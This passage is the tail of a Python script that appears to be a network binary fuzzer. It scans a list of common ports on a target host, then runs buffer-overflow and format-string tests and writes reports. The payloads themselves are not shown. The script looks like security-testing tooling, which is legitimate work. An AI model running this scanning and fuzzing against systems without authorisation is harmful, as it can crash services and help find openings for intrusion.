    parser.add_argument("--quick", action="store_true", help="Quick test (buffer overflow + format string only)")
    parser.add_argument("--quiet", action="store_true", help="Suppress per-test output")

    args = parser.parse_args()

    if args.discover:
        print(f"[*] Discovering open ports on {args.host}...")
        open_ports = []
        common_ports = [
            22, 80, 443, 3000, 4000, 5000, 8080, 8081, 8090,
            8443, 9090, 8888, 4567, 7000, 9000, 3001, 5001,
        ]

        def check(p):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)
                    if s.connect_ex((args.host, p)) == 0:
                        return p
            except Exception:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            for p in ex.map(check, common_ports):
                if p:
                    open_ports.append(p)
                    print(f"  Port {p}: OPEN")

        if not open_ports:
            print("[!] No open ports found")
            sys.exit(1)

        for port in open_ports:
            print(f"\n[*] Testing port {port}...")
            fuzzer = BinaryFuzzer(args.host, port, args.timeout, not args.quiet)
            fuzzer.run_all()
            fuzzer.generate_report(args.output)
    else:
        if not args.port:
            print("ERROR: --port is required (or use --discover)")
            sys.exit(1)

        fuzzer = BinaryFuzzer(args.host, args.port, args.timeout, not args.quiet)

        if args.quick:
            fuzzer.test_buffer_overflows()
            fuzzer.test_format_strings()
            fuzzer._print_summary()
        else:
            fuzzer.run_all()

        fuzzer.generate_report(args.output)


if __name__ == "__main__":
    main()
